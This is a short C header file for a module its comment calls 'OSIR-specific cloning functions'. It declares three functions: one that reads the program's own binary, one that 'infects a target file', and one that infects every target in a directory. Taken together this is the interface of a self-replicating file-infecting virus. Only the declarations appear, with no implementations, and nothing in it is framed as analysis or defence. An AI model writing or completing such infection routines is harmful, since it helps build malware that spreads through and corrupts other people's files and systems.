/*
	This module provides OSIR-specific
	cloning functions.
*/
#ifndef HEADER_CLONELIB
#define HEADER_CLONELIB
#include <stdbool.h>
#include <stdint.h>

	//Gets own binary
int64_t getOwnBytes(char **, const char *);

	//Infects a target file
bool infectTarget(const char *, const char *, const int64_t);

	//Infects all targets in a directory
bool infectDirectory(const char *, const char *);
#endif
